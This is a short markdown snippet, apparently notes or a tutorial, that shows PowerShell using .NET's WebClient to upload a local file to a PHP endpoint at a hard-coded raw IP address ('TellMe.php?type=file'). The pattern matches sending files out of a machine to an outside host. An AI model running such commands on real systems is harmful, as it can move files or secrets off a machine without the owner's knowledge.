## 🎈 Uploading File
This one is done via PowerShell
```csharp
$wc = New-Object System.Net.WebClient;
$url = "http://194.233.71.142/ll/TellMe.php?type=file"
```
Declare .NET Framework's WebClient.
```csharp
 $resp = $wc.UploadFile($url, "file to upload")
```

Goodluck 💕